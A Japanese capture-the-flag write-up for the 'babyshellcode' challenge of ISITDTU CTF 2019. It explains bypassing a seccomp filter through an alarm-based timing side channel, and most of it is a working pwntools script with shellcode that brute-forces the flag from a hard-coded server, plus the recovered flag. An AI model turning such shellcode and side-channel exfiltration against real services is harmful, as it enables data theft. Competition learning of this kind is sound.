# [pwn 738pts] babyshellcode - ISITDTU CTF 2019
64ビットです。
```
$ checksec -f babyshellcode
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      No	0		2	babyshellcode
```
shellcode問題で、alarm以外のシステムコールがseccompで禁止されています。
一見無理ですが、よく見るとフラグを読み込む処理が最初にありました。
フラグは読み込まれると、ランダムな8バイトのデータとxorされます。
しかしこのCTFではフラグは`ISITDTU{`から始まるので鍵が求まります。
さて、今回のバイナリでは出力ができない上、サーバー側で3秒経つまでコネクションを継続するようになっています。
したがってTime-based attackが出来なさそうに見えますが、alarmが使えるので1秒でalarmを発行するように変更すればAlarmのメッセージが1秒で出力されます。これを利用すればフラグを1バイトずつチェックできます。前のInterKosenCTFやDEFCONで出た問題の応用という感じですかね。

```python
from pwn import *
import string

table = string.printable[:-5]
flag = "ISITDTU{"
#flag = "ISITDTU{y0ur_sh3llc0d3_Sk!LL_s0_g00000d}"
while True:
    x = len(flag)
    for c in table:
        #sock = remote("localhost", 2222)
        sock = remote("209.97.162.170", 2222)
        shellcode = asm("""
        // rdi = XOR KEY
        mov rsi, 0xcafe000
        mov rdi, [rsi]
        mov rbx, 0x7b55544454495349
        xor rdi, rbx

        // shift key
        xor rbx, rbx
        mov al, {x}
        mov bl, 8
        div rbx
        imul rdx, rbx
        mov rcx, rdx
        shr rdi, cl
        mov al, [rsi + {x}]
        xor rax, rdi
        cmp al, {c}
        jz loop
        xor rdi, rdi
        inc edi
        mov rax, 0x25
        syscall
        loop:
        jmp loop
        """.format(x=x, c=ord(c)), arch="amd64")
        assert len(shellcode) < 0x46

        sock.sendline(shellcode)
        try:
            if "timeout" in sock.recv():
                flag += c
                break
        except KeyboardInterrupt:
            exit()
        except:
            flag += c
            break
        sock.close()
    else:
        print("Something went wrong!")
        exit()
    print(flag)
```

# 感想
やっててよかったInterKosenCTF。